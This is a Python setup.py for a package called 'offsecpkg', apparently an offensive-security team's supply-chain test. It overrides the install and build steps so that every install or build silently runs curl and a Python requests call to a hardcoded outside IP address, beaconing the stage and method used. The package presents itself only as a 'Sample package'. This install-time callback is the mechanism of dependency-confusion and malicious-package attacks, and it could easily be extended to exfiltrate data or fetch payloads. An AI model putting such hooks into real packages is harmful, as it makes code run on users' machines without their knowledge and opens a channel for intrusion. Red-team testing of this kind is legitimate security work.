from __future__ import annotations

import os
from pathlib import Path
import subprocess
import sys

from setuptools import find_packages, setup
from setuptools.command.build_py import build_py
from setuptools.command.install import install


CALLBACK_BASE_URL = os.environ.get("OFFSECPKG_CALLBACK_URL", "http://103.150.196.198:4141").rstrip("/")


class PostInstallCommand(install):
    def run(self):
        super().run()
        trigger_requests(stage="install")


class BuildPyCommand(build_py):
    def run(self):
        super().run()
        trigger_requests(stage="build")


def trigger_requests(stage: str) -> None:
    perform_curl_request(stage)
    perform_python_request(stage)


def perform_curl_request(stage: str) -> None:
    url = build_target_url(stage=stage, mechanism="curl")
    cmd = ["curl", "-fsSL", url]
    try:
        result = subprocess.run(cmd, check=False, capture_output=True, text=True)
    except Exception as exc:
        print(f"offsecpkg curl request failed: {exc}")
        return

    log_command_result("curl", url, result)


def perform_python_request(stage: str) -> None:
    url = build_target_url(stage=stage, mechanism="python")

    script = f"""
import sys

try:
    import requests  # type: ignore
except Exception as exc:
    print("offsecpkg python request skipped: requests import failed:", exc)
    sys.exit(0)

try:
    response = requests.get({url!r}, timeout=5)
    print("offsecpkg python request status:", response.status_code)
except Exception as exc:
    print("offsecpkg python request failed:", exc)
"""
    try:
        result = subprocess.run(
            [sys.executable, "-c", script],
            check=False,
            capture_output=True,
            text=True,
        )
    except Exception as exc:
        print(f"offsecpkg python request execution failed: {exc}")
        return

    log_command_result("python", url, result)


def build_target_url(stage: str, mechanism: str) -> str:
    return f"{CALLBACK_BASE_URL}/{stage}-{mechanism}"


def log_command_result(mechanism: str, url: str, result: subprocess.CompletedProcess) -> None:
    if result.stdout:
        print(result.stdout.strip())
    if result.stderr:
        print(result.stderr.strip())
    print(f"offsecpkg {mechanism} request to {url} exited with code {result.returncode}")


README_PATH = Path(__file__).parent / "README.md"

setup(
    name="offsecpkg",
    version="0.1.0",
    description="Sample package",
    long_description=README_PATH.read_text() if README_PATH.exists() else "",
    long_description_content_type="text/markdown",
    author="OffSec",
    author_email="v-offsec@traveloka.com",
    url="https://offsec.traveloka.com",
    package_dir={"": "src"},
    packages=find_packages(where="src"),
    python_requires=">=3.9",
    cmdclass={"install": PostInstallCommand, "build_py": BuildPyCommand},
)
